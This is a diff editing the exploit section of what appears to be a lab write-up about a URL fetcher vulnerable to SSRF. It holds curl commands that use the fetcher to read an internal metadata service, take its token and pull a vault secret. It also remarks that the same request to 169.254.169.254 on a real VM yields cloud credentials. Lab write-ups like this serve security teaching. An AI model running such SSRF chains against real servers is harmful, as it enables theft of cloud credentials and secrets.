@@ -8,24 +8,28 @@ The "URL fetcher" in `/tools` fetches any URL from the server. The compose netwo
 
 ## Exploit
 
-1. Log in as any user, open **Tools**.
-2. Fetch the metadata listing:
+1. Log in as any user, open **Tools**, and fetch the metadata listing:
 
 ```text
 URL: http://imds:8090/latest/meta-data/
 ```
 
-You get `compute/instance-id`, `compute/region`, `iam/security-credentials/`.
+You get `compute/instance-id`, `compute/region`, `iam/security-credentials/` — the fetcher rendered the internal network's answer for you.
 
-3. Get the IMDS token and read the "vault" secret:
+2. Grab the IMDS token through the same fetcher:
 
 ```bash
-# grab the token through the fetcher
+curl -s -c cookies.txt -X POST http://localhost:8888/login/auth \
+  -d "username=alice" -d "password=alice123"
+
 curl -s -b cookies.txt -X POST http://localhost:8888/tools/fetch \
   --data-urlencode "url=http://imds:8090/latest/api/token"
 # IMDS-TOKEN-3f9a2c
+```
 
-# use it as bearer against the vault
+3. Exchange it at the vault for the pipeline secret:
+
+```bash
 curl -s -b cookies.txt -X POST http://localhost:8888/tools/fetch \
   --data-urlencode "url=http://vault:8091/secrets/pipeline" \
   --data-urlencode "token=IMDS-TOKEN-3f9a2c"
@@ -34,7 +38,7 @@ curl -s -b cookies.txt -X POST http://localhost:8888/tools/fetch \
 
 One-liner chain: the app's own **Run vault check** link does the full IMDS → vault dance server-side: `/tools/vault-check`.
 
-4. If this app ran on a real VM, `http://169.254.169.254/...` would return actual cloud credentials.
+4. If this app ran on a real VM, `http://169.254.169.254/...` would return actual cloud credentials — same bug, real keys, real bill.
 
 ## Why it happens
 
